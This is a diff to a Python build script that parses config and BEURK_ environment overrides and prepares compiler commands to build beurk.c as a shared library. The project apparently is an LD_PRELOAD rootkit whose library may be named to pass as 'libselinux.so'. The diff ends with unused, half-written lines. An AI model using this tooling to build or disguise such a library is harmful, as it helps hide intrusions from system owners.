@@ -23,17 +23,18 @@ CONFIG_KEYS = {
         "ENABLE_PAM": type_bool,
         "ENABLE_PCAP": type_bool,
         "ENABLE_SSL": type_bool,
+        "CC": type_str,
         }
 
 
 def help():
     """display usage help message and exit
     """
-    print("Usage: %s <config-file> [KEY=val ...]" % sys.argv[0])
+    print("Usage: %s <config-file>" % sys.argv[0])
     sys.exit(1)
 
 
-def get_config(lines):
+def get_config(lines, check_missing_vars=True):
     result = {}
     for lineno, line in enumerate(lines, 1):
         line = line.strip()
@@ -54,6 +55,11 @@ def get_config(lines):
             msg = "line %d: %r expects %s"
             raise SyntaxError(msg % (lineno, key, func_name))
         result[key] = val
+    if check_missing_vars:
+        for expected_key in CONFIG_KEYS.keys():
+            if expected_key not in result.keys():
+                raise SyntaxError("key %r is not defined" % expected_key)
+
     return result
 
 
@@ -80,11 +86,13 @@ def check_lib_dependencies():
     return False if missing_deps else True
 
 
+###############################################################################
 ### parse arguments
 
 if len(sys.argv) < 2:
     help()
 
+# read config file
 try:
     config_lines = open(sys.argv[1]).read().splitlines()
     config = get_config(config_lines)
@@ -92,14 +100,49 @@ except Exception as e:
     sys.stderr.write("config file error: %s:\n" % sys.argv[1])
     sys.exit("-> %s" % e)
 
-for argnum, keyval in enumerate(sys.argv[2:], 2):
+# read beurk environment variables
+for key, val in os.environ.items():
+    if not key.startswith("BEURK_"):
+        continue
     try:
-        config.update(get_config([keyval]))
+        config.update(get_config([key[6:] + "=" + val], False))
     except SyntaxError as e:
         e = str(e)
         if e.startswith("line 1:"):
-            e = "argument %d: %s" % (argnum, e[8:])
-        sys.stderr.write("variable override error:\n")
+            e = e[8:]
+        errmsg = "environment override error (on %r):\n"
+        sys.stderr.write(errmsg % key)
         sys.exit("-> %s" % e)
 
-pprint(config)
+
+###############################################################################
+### compile library
+
+SOURCES = [
+        "beurk.c",
+        ]
+
+CFLAGS = """
+-Iinclude -Wall -Wextra
+-Wdisabled-optimization -Winline
+-Wunsuffixed-float-constants
+-Wdouble-promotion -Wunknown-pragmas
+-Wno-unknown-warning-option
+-mtune=native
+""".replace("\n", " ")
+
+LDFLAGS = "-lc -ldl -lutil "
+if config["ENABLE_PAM"]:
+    LDFLAGS += "-lpam "
+
+for source in SOURCES:
+    cmd = "{CC} -fPIC -g -c ".format(**config) + source
+    pprint(cmd)
+
+objects = " ".join([x.replace(".c", ".o") for x in SOURCES])
+a = "{CC} -fPIC -shared -Wl,-soname,{LIBRARY_NAME}"
+b = "{LDFLAGS} -o {LIBRARY_NAME}"
+
+
+
+"strip libselinux.so"
